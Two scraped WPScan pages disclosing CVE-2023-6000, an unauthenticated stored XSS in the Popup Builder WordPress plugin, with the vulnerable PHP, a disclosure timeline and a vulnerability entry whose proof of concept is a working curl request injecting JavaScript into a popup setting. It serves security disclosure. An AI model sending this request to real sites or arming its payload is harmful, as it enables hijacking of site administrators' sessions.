=== Content from wpscan.com_94a9ef51_20250115_091331.html ===


* [Features](https://a8cteam5105.wordpress.com/features/)
* [Pricing](https://a8cteam5105.wordpress.com/pricing/)
* Solutions
  + [Status](https://status.wpscan.com/)
  + [API Details](/api)
  + [CLI Scanner](https://a8cteam5105.wordpress.com/wordpress-cli-scanner/)
* Vulnerabilities
  + [Themes](/themes)
  + [WordPress](/wordpresses)
  + [Plugins](/plugins)
  + [Stats](/statistics)
  + [Submit Vulnerabilities](/submit)
  + [Leaderboard](/leaderboard)
* Resources
  + [Blog](/blog)
  + [Enterprise Features](https://a8cteam5105.wordpress.com/enterprise-customers-features/)
  + [How to Install WPScan](https://a8cteam5105.wordpress.com/how-to-install-wpscan/)
  + [WPScan Glossary](/wpscan-glossary)
  + [2024 Website Threat Report](https://wpscan.com/2023-website-threat-report/)

Search

Updated on December 12, 2023December 11, 2023
# Stored XSS Fixed In Popup Builder 4.2.3

During an analysis of [the Popup Builder plugin](https://wordpress.org/plugins/popup-builder/), we discovered a pretty serious Stored XSS vulnerability that can be exploited by any attackers, regardless of whether they have an account on the site.

When successfully exploited, this vulnerability may let attackers perform any action the logged‑in administrator they targeted is allowed to do on the targeted site, including installing arbitrary plugins, and creating new rogue Administrator users.

Upon identifying the vulnerability, we promptly alerted the authors of that plugin, who released version 4.2.3 to fix the issue. It is crucial for administrators of sites using this plugin to ensure it is fully updated to safeguard against this vulnerability.

### Unauthenticated Stored XSS

| **Fixed Version** | 4.2.3 |
| --- | --- |
| **CVE-ID** | [CVE-2023-6000](https://www.cve.org/CVERecord?id=CVE-2023-6000) |
| **WPVDB ID** | [cdb3a8bd-4ee0-4ce0-9029-0490273bcfc8](https://wpscan.com/vulnerability/cdb3a8bd-4ee0-4ce0-9029-0490273bcfc8/) |
| **CVSSv3.1** | [8.8](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H&version=3.1) |

```

 public static function parsePopupDataFromData($data)
    {
        $popupData = array();
        $data = apply_filters('sgpbFilterOptionsBeforeSaving', $data);
        foreach ($data as $key => $value) {
            if ( !is_array( $value ) ) {
                //Sanitize URL to avoid 404 error
                if ( strpos( $key, '-url' ) === false )
                    $value = sanitize_text_field( $value );
                else
                    $value = wp_sanitize_redirect( $value );
            }
            if (strpos($key, 'sgpb') === 0) {
                $popupData[$key] = $value;
            }
            if (is_array($value) && isset($value['name']) && strpos($value['name'], 'sgpb') === 0) {
                $popupData[$value['name']] = sanitize_text_field( $value['value'] );
            }
            else if (is_array($value) && isset($value['name']) && strpos($value['name'], 'post_ID') === 0) {
                $popupData['sgpb-post-id'] = (int) sanitize_text_field( $value['value'] );
            }
        }
        return $popupData;
    }

```

The plugin presented a few inconsistencies in how it grabbed certain POST parameters across the plugin. Some places would directly use `$_POST['key']`, whereas others would use the plugin’s `SGPopup::parsePopupDataFromData();` method. This led to logic bugs, where the plugin would first check `$_POST` in `IF` conditional statements, but then grab the value of that parameter through the method to do things

This, combined with a sensitive post‑previewing function we found to be hooked on the WordPress `init` action without any proper capability checks in place, led to us discovering this could be escalated to conduct Stored XSS attacks without requiring any type of accounts on the targeted site.

A proof of concept will be made available on [the WPScan entry for this issue](https://wpscan.com/vulnerability/cdb3a8bd-4ee0-4ce0-9029-0490273bcfc8/) on January 1st, 2024.

**Timeline**

* 2023‑11‑07 – Details of the vulnerability sent to the Popup Builder team
* 2023‑11‑13 – Popup Builder 4.2.2 is released, but still vulnerable
* 2023‑11‑21 – We escalate the issue to WordPress.org’s Plugin team
* 2023‑12‑07 – Patch released by the Popup Builder team on version 4.2.3

**Credits**

Original research: Marc Montpas

Thanks to the rest of the WPScan team for feedback, help, and corrections.

### Share this:

* [Twitter](https://wpscan.com/blog/stored-xss-fixed-in-popup-builder-4-2-3/?share=twitter "Click to share on Twitter")
* [Facebook](https://wpscan.com/blog/stored-xss-fixed-in-popup-builder-4-2-3/?share=facebook "Click to share on Facebook")
Like Loading…
## Posted by

![](https://0.gravatar.com/avatar/6fc96ab17c597fba35b3e50fdac0963304b08d097a3cb8c7a12b5aab370ca908?s=48&d=identicon&r=G)

[Marc Montpas](https://wpscan.com/blog/author/marcs0h/)

## Get News and Tips From WPScan

Type your email…

Subscribe

![](https://wpscan.com/wp-content/uploads/2023/10/wpscan-logo-dark.png?w=246)

### Vulnerabilities

* [WordPress](/wordpresses)
* [Plugins](/plugins)
* [Themes](/themes)
* [Our Stats](https://a8cteam5105.wordpress.com/statistics/)
* [Submit vulnerabilities](https://a8cteam5105.wordpress.com/submit/)

#### About

* [How it works](/features)
* [Pricing](/pricing)
* [WordPress plugin](https://wordpress.org/plugins/wpscan/)
* [Blog](/blog)
* [Contact](/contact)

#### For Developers

* [Status](https://status.wpscan.com/)
* [API details](/api)
* [CLI scanner](/wordpress-cli-scanner)

#### Other

* [Privacy](https://automattic.com/privacy/)
* [Terms of service](/terms)
* [Submission terms](/submission-terms/)
* [Disclosure policy](/vulnerability-disclosure-policy)
* [Privacy Notice for California Users](https://automattic.com/privacy/#california-consumer-privacy-act-ccpa)

---

![](https://wpscan.com/wp-content/uploads/2023/08/frame-1323.png?w=48)

In partnership with [Jetpack](https://jetpack.com/)

* [GitHub](https://github.com/wpscanteam/wpscan/)
* [Twitter](https://twitter.com/_wpscan_)
* [Facebook](https://www.facebook.com/WPScan)

---

An

![](https://wpscan.com/wp-content/uploads/2023/08/autpmattic-logo.png?w=298)

endeavor

[Work With Us](https://automattic.com/work-with-us/)

[Press](https://automattic.com/press/)

* Reblog
* Subscribe
  Subscribed

  + [![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan](https://wpscan.com)

  Join 30,404 other subscribers

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Fstored-xss-fixed-in-popup-builder-4-2-3%252F)
* Privacy
* + [![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan](https://wpscan.com)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Fstored-xss-fixed-in-popup-builder-4-2-3%252F)
  + [Copy shortlink](https://wp.me/pf0jyo-SG)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://wpscan.com/blog/stored-xss-fixed-in-popup-builder-4-2-3/)
  + [View post in Reader](https://wordpress.com/read/blogs/221720208/posts/3390)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

%d

![](https://pixel.wp.com/b.gif?v=noscript)


=== Content from wpscan.com_ecba6f56_20250115_091334.html ===


[Skip to content](#wp--skip-link--target)

* [Features](https://a8cteam5105.wordpress.com/features/)
* [Pricing](https://a8cteam5105.wordpress.com/pricing/)
* Solutions
  + [Status](https://status.wpscan.com/)
  + [API Details](/api)
  + [CLI Scanner](https://a8cteam5105.wordpress.com/wordpress-cli-scanner/)
* Vulnerabilities
  + [Themes](/themes)
  + [WordPress](/wordpresses)
  + [Plugins](/plugins)
  + [Stats](/statistics)
  + [Submit Vulnerabilities](/submit)
  + [Leaderboard](/leaderboard)
* Resources
  + [Blog](/blog)
  + [Enterprise Features](https://a8cteam5105.wordpress.com/enterprise-customers-features/)
  + [How to Install WPScan](https://a8cteam5105.wordpress.com/how-to-install-wpscan/)
  + [WPScan Glossary](/wpscan-glossary)
  + [2024 Website Threat Report](https://wpscan.com/2023-website-threat-report/)

Search

## WordPress Plugin Vulnerabilities

# Popup Builder < 4.2.3 - Unauthenticated Stored XSS

### Description

The plugin does not prevent simple visitors from updating existing popups, and injecting raw JavaScript in them, which could lead to Stored XSS attacks.

### Proof of Concept

1) Create a popup using the plugin
2) Run the following curl command, switching `$POPUPID` with that popup's ID:
```
curl --url 'http://vulnerable-site.tld/' --data 'sgpb-is-preview=1&blah[name]=sgpb-is-preview&blah[value]=0&post\_ID=$POPUPID&sgpb-target%5B0%5D%5B0%5D%5Bparam%5D=everywhere&sgpb-type=html&sgpb-is-active=checked&sgpb-events%5B0%5D%5B0%5D%5Bparam%5D=load&sgpb-events%5B0%5D%5B0%5D%5Bvalue%5D=&sgpb-behavior-after-special-events%5B0%5D%5B0%5D%5Bparam%5D=contact-form-7&sgpb-behavior-after-special-events%5B0%5D%5B0%5D%5Boperator%5D=redirect-url&sgpb-behavior-after-special-events%5B0%5D%5B0%5D%5Bvalue%5D=https%3A%2F%2Fexample.com&sgpb-popup-z-index=9999&sgpb-popup-themes=sgpb-theme-1&sgpb-overlay-color=&sgpb-overlay-opacity=0.8&sgpb-content-custom-class=sg-popup-content&sgpb-esc-key=on&sgpb-enable-close-button=on&sgpb-close-button-delay=0&sgpb-close-button-position=bottomRight&sgpb-button-position-top=&sgpb-button-position-right=9&sgpb-button-position-bottom=9&sgpb-button-position-left=&sgpb-button-image=&sgpb-button-image-width=21&sgpb-button-image-height=21&sgpb-border-color=%23000000&sgpb-border-radius=0&sgpb-border-radius-type=%25&sgpb-button-text=Close&sgpb-overlay-click=on&sgpb-popup-dimension-mode=responsiveMode&sgpb-responsive-dimension-measure=auto&sgpb-width=640px&sgpb-height=480px&sgpb-max-width=&sgpb-max-height=&sgpb-min-width=120px&sgpb-min-height=&sgpb-copy-to-clipboard-message=Copied+to+Clipboard%21&sgpb-open-animation-effect=No+effect&sgpb-close-animation-effect=No+effect&sgpb-enable-content-scrolling=on&sgpb-popup-order=0&sgpb-popup-delay=0&sgpb-ShouldOpen=alert%28document.domain%29%3B&sgpb-WillOpen=&sgpb-DidOpen=&sgpb-ShouldClose=&sgpb-WillClose=&sgpb-DidClose=&sgpb-css-editor='
```
3) Visit the site

### Affects Plugins

[![Plugin icon](https://s2.wp.com/wp-content/themes/a8c/wpscan/assets/img/plugin-icon.svg)

popup-builder](https://a8cteam5105.wordpress.com/plugin/popup-builder/)

![](https://s2.wp.com/wp-content/themes/a8c/wpscan/assets/img/checkmark-green-alt.svg)
Fixed in 4.2.3

### References

CVE
[CVE-2023-6000](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-6000)

URL
<https://wpscan.com/blog/stored-xss-fixed-in-popup-builder-4-2-3/>

### Classification

Type
XSS

OWASP top 10
[A7: Cross-Site Scripting (XSS)](https://www.owasp.org/index.php/Top_10-2017_A7-Cross-Site_Scripting_%28XSS%29)

CWE
[CWE-79](https://cwe.mitre.org/data/definitions/79.html)

CVSS
[8.8 (high)](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H)

### Miscellaneous

Original Researcher
Marc Montpas

Submitter
Marc Montpas

Submitter website
<https://wpscan.com>

Submitter twitter
[marcS0H](//twitter.com/marcS0H)

Verified
Yes

WPVDB ID
[cdb3a8bd-4ee0-4ce0-9029-0490273bcfc8](https://a8cteam5105.wordpress.com/vulnerability/cdb3a8bd-4ee0-4ce0-9029-0490273bcfc8/)

### Timeline

Publicly Published
2023-12-11 (about 1 years ago)

Added
2023-12-11 (about 1 years ago)

Last Updated
2023-12-11 (about 1 years ago)

### Other

Published
Title

Published
2024-11-08
Title
[Fast Video and Image Display <= 2.5.2 - Authenticated (Contributor+) Stored Cross-Site Scripting](https://a8cteam5105.wordpress.com/vulnerability/84afa0dd-0b9d-42ce-bef3-e9d28ea8ebfd/)

Published
2024-06-05
Title
[MultiVendorX Marketplace – WooCommerce MultiVendor Marketplace Solution < 4.1.12 - Authenticated (Contributor+) Stored Cross-Site Scripting via hover\_animation Parameter](https://a8cteam5105.wordpress.com/vulnerability/47b2f823-47de-469a-80f2-aeb15162e92d/)

Published
2023-11-28
Title
[Google Calendar Events < 3.2.8 - Contributor+ Stored XSS via shortcode](https://a8cteam5105.wordpress.com/vulnerability/b3d98c33-76fa-4c2b-b438-906702377fb8/)

Published
2024-10-14
Title
[WooCommerce < 9.1.0 - Unauthenticated HTML Injection](https://a8cteam5105.wordpress.com/vulnerability/ccef1e59-40df-4645-aacb-4bb9c4b96456/)

Published
2022-12-16
Title
[iPanorama 360 WordPress Virtual Tour Builder < 1.6.30 - Contributor+ Stored XSS](https://a8cteam5105.wordpress.com/vulnerability/c298e3dc-09a7-40bb-a361-f49af4bce77e/)

![](https://wpscan.com/wp-content/uploads/2023/10/wpscan-logo-dark.png?w=246)

### Vulnerabilities

* [WordPress](/wordpresses)
* [Plugins](/plugins)
* [Themes](/themes)
* [Our Stats](https://a8cteam5105.wordpress.com/statistics/)
* [Submit vulnerabilities](https://a8cteam5105.wordpress.com/submit/)

#### About

* [How it works](/features)
* [Pricing](/pricing)
* [WordPress plugin](https://wordpress.org/plugins/wpscan/)
* [Blog](/blog)
* [Contact](/contact)

#### For Developers

* [Status](https://status.wpscan.com/)
* [API details](/api)
* [CLI scanner](/wordpress-cli-scanner)

#### Other

* [Privacy](https://automattic.com/privacy/)
* [Terms of service](/terms)
* [Submission terms](/submission-terms/)
* [Disclosure policy](/vulnerability-disclosure-policy)
* [Privacy Notice for California Users](https://automattic.com/privacy/#california-consumer-privacy-act-ccpa)

---

![](https://wpscan.com/wp-content/uploads/2023/08/frame-1323.png?w=48)

In partnership with [Jetpack](https://jetpack.com/)

* [GitHub](https://github.com/wpscanteam/wpscan/)
* [Twitter](https://twitter.com/_wpscan_)
* [Facebook](https://www.facebook.com/WPScan)

---

An

![](https://wpscan.com/wp-content/uploads/2023/08/autpmattic-logo.png?w=298)

endeavor

[Work With Us](https://automattic.com/work-with-us/)

[Press](https://automattic.com/press/)

* Subscribe
  Subscribed

  + [![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan](https://wpscan.com)

  Join 30,404 other subscribers

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Funauthorized-plugin-installation-activation-in-hunk-companion%252F)
* Privacy
* + [![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan](https://wpscan.com)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Funauthorized-plugin-installation-activation-in-hunk-companion%252F)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://wpscan.com)
  + [View site in Reader](https://wordpress.com/read/feeds/156197069)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

![](https://pixel.wp.com/b.gif?v=noscript)

